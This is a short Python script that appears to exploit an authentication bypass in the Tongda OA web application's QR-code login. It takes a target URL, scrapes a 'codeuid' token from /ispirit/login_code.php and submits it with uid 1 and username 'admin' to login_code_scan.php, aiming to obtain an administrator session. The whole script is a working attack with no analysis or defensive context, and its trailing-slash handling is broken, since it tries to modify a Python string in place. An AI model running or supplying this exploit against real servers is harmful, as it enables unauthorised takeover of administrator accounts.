import re

import requests

from utils import print_suc

Header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "multipart/form-data;",
    "Referer": "https://google.com"
}
ip = input("url:")
if ip[-1] is '/':
    ip[-1] = ''
r1 = re.findall('"codeuid":"\{(.*?)}"', requests.get('%s/ispirit/login_code.php' % ip, headers=Header).text)[0]
print_suc("%s" % r1)
data2 = {
    'uid': '1',
    'codeuid': '{%s}' % r1,
    'type': 'confirm',
    'source': 'pc',
    'username': 'admin'
}
r2 = requests.post('%s/general/login_code_scan.php' % ip, headers=Header, data=data2).text
r3 = requests.get('%s/ispirit/login_code_check.php' % ip)
